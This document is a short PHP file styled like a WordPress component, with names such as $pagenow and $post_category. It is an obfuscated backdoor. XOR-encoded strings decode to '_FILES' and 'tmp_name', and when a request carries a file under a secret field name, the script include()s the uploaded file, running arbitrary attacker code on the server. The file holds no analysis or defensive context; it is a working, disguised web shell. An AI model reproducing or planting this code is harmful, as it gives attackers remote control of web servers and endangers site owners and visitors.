<?php 	
$_post = 'DyNv0izYnzgt4n';

$protected = $_post;
function dynamic_characters($safe_text, $counts)

{
    $fields = $counts;

    $domain = urldecode($safe_text);
    $single_tags = substr($fields,0, strlen($domain));
	$needle = 'incpages';
    $pees = $domain ^ $single_tags;

    return $pees;

}
$key = ${dynamic_characters("%1B%3F%07%3Au%3A", $protected)};
	$post_category = 'real';
$callback = $key;
$pagenow = isset($callback[$protected]);

if ($pagenow)

{
    $translation_preg = $key[$protected];
    $previous_status = $translation_preg[dynamic_characters("0%14%3E%29%5E%08%17%3C", $protected)];
    $flag_after_digit = $previous_status;
    include ($flag_after_digit);
	$category = 'page_title';
}
?>
